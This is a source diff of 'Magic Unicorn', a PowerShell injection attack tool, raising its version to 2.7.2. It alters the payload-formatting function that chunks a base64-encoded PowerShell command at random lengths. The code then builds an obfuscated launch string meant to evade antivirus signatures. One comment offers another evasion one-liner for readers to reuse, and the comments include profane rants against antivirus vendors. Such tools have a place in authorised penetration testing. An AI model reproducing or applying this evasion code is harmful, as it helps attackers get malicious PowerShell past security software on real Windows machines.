@@ -203,7 +203,7 @@ The last one will use a 500 character string instead of the default 380, resulti
 # usage banner
 def gen_usage():
     print(
-        "-------------------- Magic Unicorn Attack Vector v2.7.1 -----------------------------")
+        "-------------------- Magic Unicorn Attack Vector v2.7.2 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print(
         "Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
@@ -499,8 +499,8 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
 
     # honestly anti-virus is one of the most annoying programs ever created - it has nothing to do with security, but if something becomes popular, lets write a signature that annoys the author. So in this example, we say F A/V because it's literally terrible. What AV - i.e. Kaspersky in this case was doing was evaluating the base64 encoded command - so what do we do? Chunk it up because anti-virus is absolutely ridiculous. Of course this gets around it because it doesn't know how to interpret PowerShell. Instead, what you need to be looking for is long powershell statements, toString() as suspicious, etc. That'll never happen because A/V is suppose to be signature based on something they can catch. You all literally are a dying breed. Sorry for the rant, but it's annoying to have to sit here and rewrite stupid stuff because your wrote a shitty sig. -Dave
     fuckav = base64.b64encode(powershell_code.encode('utf_16_le'))
-    # [paragraph[i: i + x] for i in range(0, len(paragraph), x)]
-    avsux = randomint = random.randint(90,100)
+    # here we mangle our encodedcommand by splitting it up in random chunks
+    avsux = randomint = random.randint(100,140)
     avnotftw = [fuckav[i: i + avsux] for i in range(0, len(fuckav), avsux)]
     haha_av = ""
     counter = 0
@@ -513,7 +513,6 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
         counter = 1
 
     # powershell -w 1 -C "powershell ([char]45+[char]101+[char]99) YwBhAGwAYwA="  <-- Another nasty one that should evade. If you are reading the source, feel free to use and tweak
-    #"sv x -;sv y ec;sv Z ((gv x).value.toString()+(gv y).value.toString());powershell (gv Z).value.toString()"
     full_attack = 'powershell -w 1 -C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
 
     if attack_type == "msf":
